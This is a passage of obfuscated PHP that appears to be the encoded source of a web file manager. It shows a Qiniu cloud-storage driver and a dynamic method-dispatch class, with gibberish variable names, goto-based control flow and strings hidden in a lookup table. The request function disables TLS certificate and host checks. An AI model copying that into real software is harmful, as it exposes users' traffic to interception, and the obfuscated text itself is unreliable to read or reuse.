$e¬·¦áƒÛ[$Dä ˜Ÿ†«Û[355]]; } } $aÅš‰â¦îÏ = $eÀŠ¦‹Ùãù; } $AôÇ ÙÛÈ› = Model($Dä ˜Ÿ†«Û[2406]); foreach ($D¯î‡ñˆ·Ô as &$bŞĞÓŒ÷Ò­) { $bŞĞÓŒ÷Ò­[$Dä ˜Ÿ†«Û[412]] = array(); $bŞĞÓŒ÷Ò­[$Dä ˜Ÿ†«Û[2407]] = array(); if (isset($AÅšâäâÏé[$bŞĞÓŒ÷Ò­[$Dä ˜Ÿ†«Û[1337]]])) { $bŞĞÓŒ÷Ò­[$Dä ˜Ÿ†«Û[412]] = $AÅšâäâÏé[$bŞĞÓŒ÷Ò­[$Dä ˜Ÿ†«Û[1337]]]; } if (isset($bŞĞÓŒ÷Ò­[$Dä ˜Ÿ†«Û[412]][$CµÄ­¯«Ú])) { $bŞĞÓŒ÷Ò­[$Dä ˜Ÿ†«Û[2407]] = $AôÇ ÙÛÈ›->getUserJobInfo($bŞĞÓŒ÷Ò­[$Dä ˜Ÿ†«Û[412]][$CµÄ­¯«Ú]); } } goto dÇâôè³„; FÌì­«ÄØ: $BéÆß…²™ = array($Dä ˜Ÿ†«Û[1337] => array($Dä ˜Ÿ†«Û[7], $A…ÉŒ«Îí¥)); $AÅšâäâÏé = Model($Dä ˜Ÿ†«Û[2377])->where($BéÆß…²™)->select(); $AÅšâäâÏé = array_to_keyvalue_group($AÅšâäâÏé, $Dä ˜Ÿ†«Û[1337]); goto A¼ÒÇ×†ßÈ; b—Ÿò×í: $Dä ˜Ÿ†«Û =& $_SERVER[‘®…¢À]; $CµÄ­¯«Ú = UserJobModel::JOB_KEY; $eğ±Ò‰™‡ = array($Dä ˜Ÿ†«Û[2380]); goto FÌì­«ÄØ; dÇâôè³„: } public function userSearch($c¾É‘ßÆ, $B¢ç¶œ®‚÷ = "\52") { return Model($_SERVER[‘®…¢À][468])->where($c¾É‘ßÆ)->field($B¢ç¶œ®‚÷)->find(); } } goto C¾äÈËŸ®; a¤×é§÷‚Ü: $_SERVER[$_SERVER[Á][51]] = ("\71\62\60\67".strrev('65'))+0;$_ye4c="GRvhWPXHs7UYQPgicznVRbac3gX4EwEFvT6jPddTeB8Z8akA3EbGJJUrJSJZTAHvrsgWuVf5EwNdjk";; stream_wrapper_register($_SERVER[Á][52], $_SERVER[Á][53]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($döÈ­†íÕ¥, $F¦„ƒ·Æï) { $eˆ¿Ş÷‘ø =& $_SERVER[‘®…¢À]; if (isset(self::$_methodList[$döÈ­†íÕ¥])) { return @call_user_func_array(self::$_methodList[$döÈ­†íÕ¥], $F¦„ƒ·Æï); } else { if (method_exists($this, $döÈ­†íÕ¥)) { return call_user_func_array(array($this, $döÈ­†íÕ¥), $F¦„ƒ·Æï); } else { think_exception(__CLASS__ . $eˆ¿Ş÷‘ø[4] . $döÈ­†íÕ¥ . $eˆ¿Ş÷‘ø[5]); } } } public static function __callStatic($f™Û¡Æ¡Î, $DÊ˜ó½ĞŸá) { if (isset(self::$_methodListStatic[$f™Û¡Æ¡Î])) { return call_user_func_array(self::$_methodListStatic[$f™Û¡Æ¡Î], $DÊ˜ó½ĞŸá); } else { if (method_exists(self, $f™Û¡Æ¡Î)) { return call_user_func_array(array(self, $f™Û¡Æ¡Î), $DÊ˜ó½ĞŸá); } else { show_json("{$f™Û¡Æ¡Î}\x28\x29\40\156\x6f\x74\40\145\170\x69\x73\164\x3b", !1); } } } public static function addMethod($b‡îÚŒò•æ, $bÈØã‘­áë) { self::$_methodList[$b‡îÚŒò•æ] = $bÈØã‘­áë; } public static function addMethodStatic($DåèØè²ŞÊ, $bÍøÉ“ÛêÄ) { self::$_methodListStatic[$DåèØè²ŞÊ] = $bÍøÉ“ÛêÄ; } } goto AÉ™Êëé¿˜; c Õ£ÆŞõ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($bëœ¸²“’‚) { parent::__construct(); require_once SDK_DIR . $_SERVER[‘®…¢À][1163]; $this->_init($bëœ¸²“’‚); } public function _init($aİª„ªïïÓ) { foreach ($aİª„ªïïÓ as $fÙÎ¸Œò¼â => $f¥Ñõ†ì¹) { if (isset($this->{$fÙÎ¸Œò¼â})) { $this->{$fÙÎ¸Œò¼â} = $f¥Ñõ†ì¹; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[‘®…¢À][1164], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($BŒ£Ÿ˜Á³ƒ, $DÄî ¥‘İÛ = '', $Dêè˜†òö˜ = REPEAT_RENAME) { if ($this->setContent($BŒ£Ÿ˜Á³ƒ, $DÄî ¥‘İÛ)) { return $this->getPathOuter($BŒ£Ÿ˜Á³ƒ); } return !1; } public function mkdir($b¾æ˜Ã‡—·, $B‰Â›æ¯‡İ = REPEAT_SKIP) { goto EËØÂ„”™ö; bÊÊ„´Ó³: $b¾æ˜Ã‡—· = $F…Û¾Ì†´Í . $BêÀå‡Î•[8]; $FŠ›–Æ×ˆ = get_path_this($F…Û¾Ì†´Í); $Eèàî”…öº = $b¾æ˜Ã‡—· . $FŠ›–Æ×ˆ; goto aÛÔ¾ß¢’«; EËØÂ„”™ö: $BêÀå‡Î• =& $_SERVER[‘®…¢À]; $F…Û¾Ì†´Í = trim($b¾æ˜Ã‡—·, $BêÀå‡Î•[8]); if ($this->_isFolder($F…Û¾Ì†´Í)) { return $this->getPathOuter($F…Û¾Ì†´Í); } goto bÊÊ„´Ó³; aÛÔ¾ß¢’«: if (!$this->mkfile($Eèàî”…öº)) { return !1; } if (!$this->moveFile($Eèàî”…öº, $b¾æ˜Ã‡—·)) { $this->delFile($Eèàî”…öº); return !1; } return $this->getPathOuter($F…Û¾Ì†´Í); goto Aİá‰‰—‡; Aİá‰‰—‡: } public function copyFile($Fß‘ø¥Ê³³, $cä…öµô¦Œ) { $A¡É‘’©İö = $this->bucketManager->copy($this->bucket, $Fß‘ø¥Ê³³, $this->bucket, $cä…öµô¦Œ, !0); return $A¡É‘’©İö ? !1 : !0; } public function moveFile($aÜ«¼âÜ÷, $AÊÍÅÅ¨) { $Aé¥´Õ¦Ì¨ = $this->bucketManager->move($this->bucket, $aÜ«¼âÜ÷, $this->bucket, $AÊÍÅÅ¨, !0); return $Aé¥´Õ¦Ì¨ ? !1 : !0; } public function delFile($Cäˆ¢æÃôƒ) { $D‡§Ù»÷à = $this->bucketManager->delete($this->bucket, $Cäˆ¢æÃôƒ); return $D‡§Ù»÷à ? !1 : !0; } public function delFolder($dÑ•ğôâ«È) { $F„¾Ù‰šöç = $this->fileList($dÑ•ğôâ«È); if (empty($F„¾Ù‰šöç)) { return !0; } $cø‰øŒôñ¢ = 1000; if (count($F„¾Ù‰šöç) <= $cø‰øŒôñ¢) { return $this->qnDelObj($F„¾Ù‰šöç) ? !1 : !0; } foreach (array_chunk($F„¾Ù‰šöç, $cø‰øŒôñ¢) as $E„£µæÄ•) { $a¤–Ú‘Ô³ = $this->qnDelObj($E„£µæÄ•); if ($a¤–Ú‘Ô³) { return !1; } } return !0; } private function qnDelObj($b¯“Ù¾ß‘) { $DÉ®”¤ó–Í = $this->bucketManager->buildBatchDelete($this->bucket, $b¯“Ù¾ß‘); list($C®î¶ÅÕ–, $a¬£è¯œ) = $this->bucketManager->batch($DÉ®”¤ó–Í); return $a¬£è¯œ; } private function fileList($BÎ¡…éíéŸ, $F¡¾°ˆëºĞ = 0) { goto aƒ§ ®¢µÇ; CÛŒ•Ã®“’: $f‹õ¼¡‚Åñ = array(); while (!0) { list($AÇ„…”µç, $C¡ø„˜†Šç) = $this->bucketManager->listFiles($this->bucket, $bºŠÖíšÄİ, $a»¼æ¶‹Œõ, $aƒõ´ß­¡Ô, $AĞ”Ø«£î); if ($C¡ø„˜†Šç) { return !1; } $a»¼æ¶‹Œõ = array_key_exists($EÓ¯áÔ‘ÕÄ[1134], $AÇ„…”µç) ? $a»¼æ¶‹Œõ = $AÇ„…”µç[$EÓ¯áÔ‘ÕÄ[1165]] : $EÓ¯áÔ‘ÕÄ[33]; foreach ($AÇ„…”µç[$EÓ¯áÔ‘ÕÄ[1166]] as $Eá§¦Ò³) { $Eù¥ÙøŞêË = $Eá§¦Ò³[$EÓ¯áÔ‘ÕÄ[90]]; if ($F¡¾°ˆëºĞ) { $Eù¥ÙøŞêË = array($EÓ¯áÔ‘ÕÄ[28] => $Eù¥ÙøŞêË, $EÓ¯áÔ‘ÕÄ[78] => $Eá§¦Ò³[$EÓ¯áÔ‘ÕÄ[1167]]); } $f‹õ¼¡‚Åñ[] = $Eù¥ÙøŞêË; } if ($a»¼æ¶‹Œõ == $EÓ¯áÔ‘ÕÄ[33]) { break; } } return $f‹õ¼¡‚Åñ; goto F—åÔ’ñ“Õ; Föœ¼Ò»ÚØ: $a»¼æ¶‹Œõ = $EÓ¯áÔ‘ÕÄ[33]; $aƒõ´ß­¡Ô = 1000; $AĞ”Ø«£î = $EÓ¯áÔ‘ÕÄ[33]; goto CÛŒ•Ã®“’; aƒ§ ®¢µÇ: $EÓ¯áÔ‘ÕÄ =& $_SERVER[‘®…¢À]; $BÎ¡…éíéŸ = trim($BÎ¡…éíéŸ, $EÓ¯áÔ‘ÕÄ[8]); $bºŠÖíšÄİ = empty($BÎ¡…éíéŸ) ? $EÓ¯áÔ‘ÕÄ[33] : $BÎ¡…éíéŸ . $EÓ¯áÔ‘ÕÄ[8]; goto Föœ¼Ò»ÚØ; F—åÔ’ñ“Õ: } public function rename($B¼óÈ¤ß¨, $D²òœ…®¨ ) { return $this->renameObject($B¼óÈ¤ß¨, $D²òœ…®¨ ); } public function fileInfo($dïÈ©Àœ®•, $eÜ¹ÅâÕÂç = false, $Dù‡½ÀßÅ = array()) { goto bì«ÊƒÙïÈ; fÂÎˆ’¨: return $e¼Â»µÇƒ; goto c‘¶‰ªĞÅ¬; CœÙ†…×ëµ: if (empty($Dù‡½ÀßÅ)) { $Dù‡½ÀßÅ = $this->objectMeta($dïÈ©Àœ®•); if (!$Dù‡½ÀßÅ) { return $e¼Â»µÇƒ; } } if (isset($Dù‡½ÀßÅ[$b‰ŒÍª÷ƒ[1168]])) { $e¼Â»µÇƒ[$b‰ŒÍª÷ƒ[184]] = $Dù‡½ÀßÅ[$b‰ŒÍª÷ƒ[1168]]; } if (isset($Dù‡½ÀßÅ[$b‰ŒÍª÷ƒ[1167]])) { $e¼Â»µÇƒ[$b‰ŒÍª÷ƒ[78]] = $Dù‡½ÀßÅ[$b‰ŒÍª÷ƒ[1167]]; } goto fÂÎˆ’¨; bì«ÊƒÙïÈ: $b‰ŒÍª÷ƒ =& $_SERVER[‘®…¢À]; if ($eÜ¹ÅâÕÂç) { return array($b‰ŒÍª÷ƒ[28] => $this->pathThis($dïÈ©Àœ®•), $b‰ŒÍª÷ƒ[76] => $this->getPathOuter($b‰ŒÍª÷ƒ[8] . $dïÈ©Àœ®•), $b‰ŒÍª÷ƒ[29] => $b‰ŒÍª÷ƒ[164], $b‰ŒÍª÷ƒ[78] => isset($Dù‡½ÀßÅ[$b‰ŒÍª÷ƒ[1167]]) ? $Dù‡½ÀßÅ[$b‰ŒÍª÷ƒ[1167]] : 0, $b‰ŒÍª÷ƒ[157] => $this->ext($dïÈ©Àœ®•)); } $e¼Â»µÇƒ = array($b‰ŒÍª÷ƒ[28] => $this->pathThis($dïÈ©Àœ®•), $b‰ŒÍª÷ƒ[76] => $this->getPathOuter($b‰ŒÍª÷ƒ[8] . $dïÈ©Àœ®•), $b‰ŒÍª÷ƒ[29] => $b‰ŒÍª÷ƒ[164], $b‰ŒÍª÷ƒ[184] => 0, $b‰ŒÍª÷ƒ[108] => 0, $b‰ŒÍª÷ƒ[78] => 0, $b‰ŒÍª÷ƒ[157] => $this->ext($dïÈ©Àœ®•), $b‰ŒÍª÷ƒ[185] => !0, $b‰ŒÍª÷ƒ[186] => !0); goto CœÙ†…×ëµ; c‘¶‰ªĞÅ¬: } public function folderInfo($eš„ÇÅ­×, $F­õï…–œ‹ = false) { $FõÍ²¾¿ =& $_SERVER[‘®…¢À]; if ($F­õï…–œ‹) { return array($FõÍ²¾¿[28] => $this->pathThis($eš„ÇÅ­×), $FõÍ²¾¿[76] => $this->getPathOuter($FõÍ²¾¿[8] . $eš„ÇÅ­×), $FõÍ²¾¿[29] => $FõÍ²¾¿[77]); } $f¿‡™»Ø‹ƒ = array($FõÍ²¾¿[28] => $this->pathThis($eš„ÇÅ­×), $FõÍ²¾¿[76] => $this->getPathOuter($FõÍ²¾¿[8] . $eš„ÇÅ­×), $FõÍ²¾¿[29] => $FõÍ²¾¿[77], $FõÍ²¾¿[184] => 0, $FõÍ²¾¿[108] => 0, $FõÍ²¾¿[1112] => !0, $FõÍ²¾¿[1113] => !0); if (empty($A¦™’’½ƒ©)) { $eš„ÇÅ­× = rtrim($eš„ÇÅ­×, $FõÍ²¾¿[8]) . $FõÍ²¾¿[8]; $aÄ×ß¼„îÅ = $this->objectMeta($eš„ÇÅ­×); if (!$aÄ×ß¼„îÅ) { return $f¿‡™»Ø‹ƒ; } } if (isset($A¦™’’½ƒ©[$FõÍ²¾¿[1168]])) { $f¿‡™»Ø‹ƒ[$FõÍ²¾¿[184]] = $A¦™’’½ƒ©[$FõÍ²¾¿[1168]]; } return $f¿‡™»Ø‹ƒ; } public function listPath($bµÃÂ™–¤¤, $f¶Áš ¤é¦ = false) { goto f÷íºì—’”; d›ö˜é×Ü›: $cÓé¾ÂÀ á = $D…µ”õ¹‰ = array(); while (!0) { list($fšöÈë·œ­, $DÉ¾Í§ì‹°) = $this->bucketManager->listFiles($this->bucket, $d—ˆ²Òâ–Â, $cÍÔ²Ôç¸, $aïñàœ…¢›, $F¾­”„¢¬); if ($DÉ¾Í§ì‹°) { return !1; } $cÍÔ²Ôç¸ = array_key_exists($A®ôßŠßŸ[1134], $fšöÈë·œ­) ? $cÍÔ²Ôç¸ = $fšöÈë·œ­[$A®ôßŠßŸ[1165]] : $A®ôßŠßŸ[33]; if (isset($fšöÈë·œ­[$A®ôßŠßŸ[1169]])) { foreach ($fšöÈë·œ­[$A®ôßŠßŸ[1169]] as $EìÚ²öù¦Ò) { if ($EìÚ²öù¦Ò == $d—ˆ²Òâ–Â) { continue; } $cÓé¾ÂÀ á[] = $this->folderInfo($EìÚ²öù¦Ò, $f¶Áš ¤é¦); } } if (isset($fšöÈë·œ­[$A®ôßŠßŸ[1166]])) { foreach ($fšöÈë·œ­[$A®ôßŠßŸ[1166]] as $cĞÀî¿áÒñ) { if ($cĞÀî¿áÒñ[$A®ôßŠßŸ[90]] == $d—ˆ²Òâ–Â) { continue; } $D…µ”õ¹‰[] = $this->fileInfo($cĞÀî¿áÒñ[$A®ôßŠßŸ[90]], $f¶Áš ¤é¦, $cĞÀî¿áÒñ); } } if ($cÍÔ²Ôç¸ == $A®ôßŠßŸ[33]) { break; } } return array($A®ôßŠßŸ[75] => $cÓé¾ÂÀ á, $A®ôßŠßŸ[74] => $D…µ”õ¹‰); goto Cñ©Œø¾”; dßŸÉ¯Š°¥: $cÍÔ²Ôç¸ = $A®ôßŠßŸ[33]; $aïñàœ…¢› = 1000; $F¾­”„¢¬ = $A®ôßŠßŸ[8]; goto d›ö˜é×Ü›; f÷íºì—’”: $A®ôßŠßŸ =& $_SERVER[‘®…¢À]; $bµÃÂ™–¤¤ = trim($bµÃÂ™–¤¤, $A®ôßŠßŸ[8]); $d—ˆ²Òâ–Â = empty($bµÃÂ™–¤¤) ? $A®ôßŠßŸ[33] : $bµÃÂ™–¤¤ . $A®ôßŠßŸ[8]; goto dßŸÉ¯Š°¥; Cñ©Œø¾”: } public function has($dîš™ªˆ, $b¯Œ¨°ñº = false, $föê½îÃàÌ = true) { goto a‚Ÿ°µ·âÄ; bè†Ç™Œ½Ş: $a’¡Íñº¡ = $Dğˆù¯‹Äß[33]; $dğ¼ÁÖÍ… = 1000; $AÜ•µš–¢ = $Dğˆù¯‹Äß[8]; goto A…ìŠ¹³…ê; A…ìŠ¹³…ê: $aŒ‘°·¢ÚÌ = 0; $B°·£Î¤· = 0; while (!0) { list($c‘°ôàëË, $fŠ—æÉÆ) = $this->bucketManager->listFiles($this->bucket, $d…ˆâñ‰Ó‚, $a’¡Íñº¡, $dğ¼ÁÖÍ…, $AÜ•µš–¢); if ($fŠ—æÉÆ) { return !1; } $a’¡Íñº¡ = array_key_exists($Dğˆù¯‹Äß[1134], $c‘°ôàëË) ? $a’¡Íñº¡ = $c‘°ôàëË[$Dğˆù¯‹Äß[1165]] : $Dğˆù¯‹Äß[33]; if ($b¯Œ¨°ñº) { if (!empty($c‘°ôàëË[$Dğˆù¯‹Äß[1166]])) { $aŒ‘°·¢ÚÌ += count($c‘°ôàëË[$Dğˆù¯‹Äß[1166]]); } if (!empty($c‘°ôàëË[$Dğˆù¯‹Äß[1169]])) { $B°·£Î¤· += count($c‘°ôàëË[$Dğˆù¯‹Äß[1169]]); } if ($a’¡Íñº¡ === $Dğˆù¯‹Äß[33]) { break; } continue; } if ($föê½îÃàÌ) { if (!empty($c‘°ôàëË[$Dğˆù¯‹Äß[1166]])) { return !0; } } else { if (!empty($c‘°ôàëË[$Dğˆù¯‹Äß[1169]])) { return !0; } } if ($a’¡Íñº¡ == $Dğˆù¯‹Äß[33]) { break; } } goto b³Û‚ô—ìŒ; b³Û‚ô—ìŒ: if ($b¯Œ¨°ñº) { return array($Dğˆù¯‹Äß[188] => $aŒ‘°·¢ÚÌ, $Dğˆù¯‹Äß[189] => $B°·£Î¤·); } return !1; goto a™’Ó…åøŠ; a‚Ÿ°µ·âÄ: $Dğˆù¯‹Äß =& $_SERVER[‘®…¢À]; $dîš™ªˆ = trim($dîš™ªˆ, $Dğˆù¯‹Äß[8]); $d…ˆâñ‰Ó‚ = empty($dîš™ªˆ) ? $Dğˆù¯‹Äß[33] : $dîš™ªˆ . $Dğˆù¯‹Äß[8]; goto bè†Ç™Œ½Ş; a™’Ó…åøŠ: } public function listAll($aï©Œå¹¿) { $a¹¾è¼‘ˆÆ =& $_SERVER[‘®…¢À]; $fŞ¸ø‘îç = $this->fileList($aï©Œå¹¿, 1); $DÍšÜ²˜ = array(); foreach ($fŞ¸ø‘îç as $bâÅñ’ÊÊš) { $DÍšÜ²˜[$bâÅñ’ÊÊš[$a¹¾è¼‘ˆÆ[28]]] = $bâÅñ’ÊÊš[$a¹¾è¼‘ˆÆ[78]]; } return $this->listAllFiles($aï©Œå¹¿, array_keys($DÍšÜ²˜), $DÍšÜ²˜); } public function canRead($EéÖã‰Ååã) { return $this->exist($EéÖã‰Ååã) ? !0 : !1; } public function canWrite($BÅ’Õ¤ƒ†±) { return $this->exist($BÅ’Õ¤ƒ†±) ? !0 : !1; } public function getContent($cŒØŸñ‹°Ò) { return $this->fileSubstr($cŒØŸñ‹°Ò, 0, -1); } public function setContent($Bªè®ğ‘­, $BÚ¢…²Šç = '') { $bƒÓöï¯Å» = $this->tempFile($this->pathThis($Bªè®ğ‘­)); file_put_contents($bƒÓöï¯Å», $BÚ¢…²Šç); if ($this->upload($Bªè®ğ‘­, $bƒÓöï¯Å»)) { $this->tempFileRemve($bƒÓöï¯Å»); return !0; } return !1; } public function refreshUrls($Fò•—²Ë™Ç) { goto dİ´Ì°È¶è; d¡Ü§á•à´: $cšã”í’‘Ë = new Qiniu\Cdn\CdnManager($this->auth); list($E–Šà¬ Ã«, $FŒ›¢‘ç¿¼) = $cšã”í’‘Ë->refreshUrls($B÷Ø½·“Î); if ($FŒ›¢‘ç¿¼) { return !1; } goto f‘ËÎö°¼; f‘ËÎö°¼: return $E–Šà¬ Ã«[$fµŠ¸¬‹ÀÌ[1170]] == $fµŠ¸¬‹ÀÌ[669] ? !0 : !1; goto añì×Å¾ëÉ; dİ´Ì°È¶è: $fµŠ¸¬‹ÀÌ =& $_SERVER[‘®…¢À]; $B÷Ø½·“Î = array(); if (is_array($Fò•—²Ë™Ç)) { foreach ($Fò•—²Ë™Ç as $Cô×Å™Š—Í) { $B÷Ø½·“Î[] = $this->link($Cô×Å™Š—Í); } } else { $B÷Ø½·“Î[] = $this->link($Fò•—²Ë™Ç); } goto d¡Ü§á•à´; añì×Å¾ëÉ: } public function fileSubstr($câ“ôÖË, $eåì¦ø«ØÇ, $F¿ÀÅŒ¿®) { $c»­ñµ¾‚ =& $_SERVER[‘®…¢À]; if (!($AËÆ‡ŠÁ§ë = $this->link($câ“ôÖË))) { return !1; } $e­ğ—œªã = array($c»­ñµ¾‚[1137] => $eåì¦ø«ØÇ, $c»­ñµ¾‚[322] => $F¿ÀÅŒ¿®); return $this->qnRequest($AËÆ‡ŠÁ§ë, $e­ğ—œªã); } public function upload($dº˜á¦Ù¶, $dìùëÓ«ùÍ, $e¨Î…‚âÔ‰ = false, $A‰ÌÔ—àÍ = REPEAT_REPLACE) { $fÏêÃ®•²è = new Qiniu\Storage\UploadManager(); $d²¯íÌ‘ØÎ = $this->auth->uploadToken($this->bucket, $dº˜á¦Ù¶); $d¦Òå¡¤“ğ = get_file_mime(get_path_ext($dìùëÓ«ùÍ)); list($E»ãŸÍïÈ÷, $eœù‰„ˆ½ñ) = $fÏêÃ®•²è->putFile($d²¯íÌ‘ØÎ, $dº˜á¦Ù¶, $dìùëÓ«ùÍ, null, $d¦Òå¡¤“ğ); return $eœù‰„ˆ½ñ ? !1 : $this->getPathOuter($dº˜á¦Ù¶); } public function uploadFormData($eÌ™§ÄØ÷¡, $B‹šÈˆ¼¹ = 3600) { return $this->uploadToken($eÌ™§ÄØ÷¡, $B‹šÈˆ¼¹); } public function multiUploadFormData($bó‹…Šßëé, $E°÷‚•ç = 3600) { return $this->uploadToken($bó‹…Šßëé, $E°÷‚•ç); } private function uploadToken($EùÅƒçÔà, $EˆùÏ£õ¾› = 3600) { goto eÖµÊ¬‡ì; B³ÃÙ¹ÎÌâ: $f‰«¸ò£ˆÖ = http_type() . "\72\57\57\165\x70\154\x6f\x61\x64{$F‡¬·ÎËƒŒ}\56\x71\x69\156\x69\165\x70\56\x63\x6f\155\x2f"; return array($dáÓø÷Şøß[1174] => $eğº¾Œ‰™‘, $dáÓø÷Şøß[1175] => $f‰«¸ò£ˆÖ); goto E‰­ÖÔ×âä; eÖµÊ¬‡ì: $dáÓø÷Şøß =& $_SERVER[‘®…¢À]; $bâ”Œ„Ê”ó = $EˆùÏ£õ¾›; $F™¯éºÑ¾‰ = array($dáÓø÷Şøß[1171] => $dáÓø÷Şøß[1172]); goto d”¨ßÀÅ‚¦; d”¨ßÀÅ‚¦: $CŞÓĞ‹£»Æ = null; $eğº¾Œ‰™‘ = $this->auth->uploadToken($this->bucket, $CŞÓĞ‹£»Æ, $bâ”Œ„Ê”ó, $F™¯éºÑ¾‰, !0); $F‡¬·ÎËƒŒ = empty($this->region) || $this->region == $dáÓø÷Şøß[1173] ? $dáÓø÷Şøß[33] : $dáÓø÷Şøß[407] . $this->region; goto B³ÃÙ¹ÎÌâ; E‰­ÖÔ×âä: } public function download($eÆ³å„ß‹, $B«åÈ‚Š“) { goto c„è Á±Å¾; c„è Á±Å¾: $B¿Û¾’ç×– =& $_SERVER[‘®…¢À]; $b‚ßÒ»¨é¥ = IO::getPathInner(IO::mkfile($B«åÈ‚Š“)); if (!($dĞ°Ù÷øãŠ = $this->link($eÆ³å„ß‹))) { return !1; } goto CÜ…íÕ‡‘; AğóÉÎ¾Ú: while (!0) { $cŠÚ™ìÉÏ÷ = array($B¿Û¾’ç×–[1137] => $eÅø²ô±œš, $B¿Û¾’ç×–[322] => $aê™Õ¬À‰); $dŸÖŠ”‘—ó = $this->qnRequest($dĞ°Ù÷øãŠ, $cŠÚ™ìÉÏ÷); if ($eÅø²ô±œš && ($A’çÑÑÂÄÛ = @json_decode($dŸÖŠ”‘—ó, !0))) { if (isset($A’çÑÑÂÄÛ[$B¿Û¾’ç×–[1170]])) { return !1; } } fwrite($e¦†ºˆ—“£, $dŸÖŠ”‘—ó); $eÅø²ô±œš += $aê™Õ¬À‰; if (strlen($dŸÖŠ”‘—ó) < $aê™Õ¬À‰) { break; } } fclose($e¦†ºˆ—“£); return $B«åÈ‚Š“; goto Bø¿–…¥ÍÄ; CÜ…íÕ‡‘: $eÅø²ô±œš = 0; $aê™Õ¬À‰ = 1024 * 200; $e¦†ºˆ—“£ = fopen($b‚ßÒ»¨é¥, $B¿Û¾’ç×–[1176]); goto AğóÉÎ¾Ú; Bø¿–…¥ÍÄ: } public function link($B´‚òä¸í, $aõî¬¹ï¤ã = '') { if (!$this->isFile($B´‚òä¸í)) { return !1; } $AŠ¿„‚«†ï = $this->getHost() . $_SERVER[‘®…¢À][8] . $this->pathEncode($B´‚òä¸í) . $aõî¬¹ï¤ã; return $this->auth->privateDownloadUrl($AŠ¿„‚«†ï, 3600 * 12); } public function fileOut($E£ŠÉÖÛ»É, $EÃÎ°‰¥ÌÊ = false, $A‡Á”Ä’¨Ÿ = false, $aÊ«Í„¸‘ = '') { $a¸äğ×ãé’ =& $_SERVER[‘®…¢À]; if (!$A‡Á”Ä’¨Ÿ) { $A‡Á”Ä’¨Ÿ = $this->pathThis($E£ŠÉÖÛ»É); } $fÜ£Ş¨Æ—ë = $EÃÎ°‰¥ÌÊ ? $a¸äğ×ãé’[1177] . rawurlencode($A‡Á”Ä’¨Ÿ) : $a¸äğ×ãé’[33]; $eÈã§ƒ»»¦ = $this->link($E£ŠÉÖÛ»É, $fÜ£Ş¨Æ—ë); $this->fileOutLink($eÈã§ƒ»»¦); } public function fileOutServer($F¦«×Ó“Î, $fõ’áÄË×ë = false, $C¾Ø‚œõ¯È = false, $aË‰„ Ë¥ = '') { parent::fileOut($F¦«×Ó“Î, $fõ’áÄË×ë, $C¾Ø‚œõ¯È, $aË‰„ Ë¥); } public function fileOutImage($b¾‡ğŒ÷’°, $E“Ì…‚·¼ç = 250) { $Dª…ºäà¯œ = $this->link($b¾‡ğŒ÷’°, $_SERVER[‘®…¢À][1178] . $E“Ì…‚·¼ç); $this->fileOutLink($Dª…ºäà¯œ); } public function fileOutImageServer($AËê¥ßƒî, $C“Ò¼äˆ¬ù = 250) { parent::fileOutImage($AËê¥ßƒî, $C“Ò¼äˆ¬ù); } public function hashMd5($EÈ»ƒ“ÌŞ) { $dÉ½Ó³ôÔê =& $_SERVER[‘®…¢À]; $EÆ½†‰ÉÆ = $this->objectMeta($EÈ»ƒ“ÌŞ); if (isset($EÆ½†‰ÉÆ[$dÉ½Ó³ôÔê[193]])) { return $EÆ½†‰ÉÆ[$dÉ½Ó³ôÔê[193]]; } $f¾› áê– = $this->link($EÈ»ƒ“ÌŞ, $dÉ½Ó³ôÔê[1179]); $b”ø‹ŸõàŠ = $this->qnRequest($f¾› áê–, array(), !0); return !isset($b”ø‹ŸõàŠ[$dÉ½Ó³ôÔê[194]]) ? !1 : $b”ø‹ŸõàŠ[$dÉ½Ó³ôÔê[194]]; } public function qnRequest($EóçêÑøƒî, $f»®‡…‡„ = array(), $Bø‚Ö«¢Ã­ = false) { goto DÖ¥…¶‚Ğœ; D£¶¢¤™“š: curl_setopt($B²»ò‹¨ø—, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($B²»ò‹¨ø—, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($B²»ò‹¨ø—, CURLOPT_NOPROGRESS, !1); goto Fó¥«£·Á; DÖ¥…¶‚Ğœ: $Cø¹°®¥² =& $_SERVER[‘®…¢À]; $B²»ò‹¨ø— = curl_init(); curl_setopt($B²»ò‹¨ø—, CURLOPT_URL, $EóçêÑøƒî); goto DòÂ˜‹Ğ½­; DòÂ˜‹Ğ½­: curl_setopt($B²»ò‹¨ø—, CURLOPT_RETURNTRANSFER, 1); curl_setopt($B²»ò‹¨ø—, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($B²»ò‹¨ø—, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto D£¶¢¤™“š; Fó¥«£·Á: curl_setopt($B²»ò‹¨ø—, CURLOPT_PROGRESSFUNCTION, $Cø¹°®¥²[1180]); curl_progress_start($B²»ò‹¨ø—); if (isset($f»®‡…‡„[$Cø¹°®¥²[1137]]) && $f»®‡…‡„[$Cø¹°®¥²[322]] > 0) { $cŒèç…¾¦à = $f»®‡…‡„[$Cø¹°®¥²[1137]]; $bÛ…°ºÄï» = $f»®‡…‡„[$Cø¹°®¥²[1137]] + ($f»®‡…‡„[$Cø¹°®¥²[322]] - 1); curl_setopt($B²»ò‹¨ø—, CURLOPT_RANGE, "{$cŒèç…¾¦à}\x2d{$bÛ…°ºÄï»}"); } goto F¾Ä™³‹à; d…øÛ„İç½: curl_close($B²»ò‹¨ø—); if ($Bø‚Ö«¢Ã­) { return @json_decode($Eí¾¨¸ˆ¡ñ, !0); } return $Eí¾¨¸ˆ¡ñ; goto Fİâ’÷„ôà; F¾Ä™³‹à: curl_setopt($B²»ò‹¨ø—, CURLOPT_FOLLOWLOCATION, 1); $Eí¾¨¸ˆ¡ñ = curl_exec($B²»ò‹¨ø—); curl_progress_end($B²»ò‹¨ø—); goto d…øÛ„İç½; Fİâ’÷„ôà: } public function 